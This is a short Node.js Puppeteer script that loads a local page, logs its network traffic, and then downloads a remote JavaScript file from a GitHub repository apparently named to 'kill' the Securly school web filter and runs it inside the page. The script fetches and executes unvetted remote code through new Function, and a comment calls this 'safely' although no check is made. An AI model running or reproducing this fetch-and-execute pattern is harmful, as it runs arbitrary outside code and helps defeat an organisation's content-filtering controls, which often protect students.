const puppeteer = require('puppeteer');
const path = require('path');

(async () => {
    // Launch the browser
    const browser = await puppeteer.launch({ headless: false });
    const page = await browser.newPage();

    let initialUrl = null;
    let finalUrl = null;

    // Function to log requests and track URLs
    async function setupRequestInterception() {
        await page.setRequestInterception(true);

        page.on('request', (request) => {
            console.log(`Request: ${request.url()}`);
            if (!initialUrl) initialUrl = request.url(); // Track the first URL
            request.continue();
        });

        page.on('response', async (response) => {
            console.log(`Response: ${response.url()} - Status: ${response.status()}`);
            if (response.status() === 200) finalUrl = response.url();
        });
    }

    // Function to fetch and execute a remote script safely
    async function injectAndExecuteScript(url) {
        try {
            const scriptContent = await page.evaluate(async (scriptUrl) => {
                const response = await fetch(scriptUrl);
                if (!response.ok) throw new Error(`Failed to fetch script: ${response.statusText}`);
                return await response.text();
            }, url);

            console.log('Script fetched successfully.');
            await page.evaluate(new Function(scriptContent));
            console.log('Script executed successfully.');
        } catch (error) {
            console.error('Error executing script:', error.message);
        }
    }

    try {
        // Set up request interception
        await setupRequestInterception();

        // Navigate to a local file
        const filePath = `file://${path.resolve(__dirname, 'index.html')}`;
        await page.goto(filePath);

        // Wait for navigation to complete
        await page.waitForNavigation({ waitUntil: 'domcontentloaded' });

        // Log the initial and final URLs
        console.log('Initial URL:', initialUrl);
        console.log('Final URL:', finalUrl);

        // Get page title
        const pageTitle = await page.title();
        console.log('Page Title:', pageTitle);

        // Inject and execute remote script if redirection occurred
        if (finalUrl) {
            const scriptUrl = 'https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/kill.js';
            await injectAndExecuteScript(scriptUrl);
        } else {
            console.log('No redirection detected.');
        }
    } catch (error) {
        console.error('An error occurred:', error.message);
    } finally {
        // Gracefully close the browser (toggle this if you want to keep it open)
        //await browser.close();
    }
})();
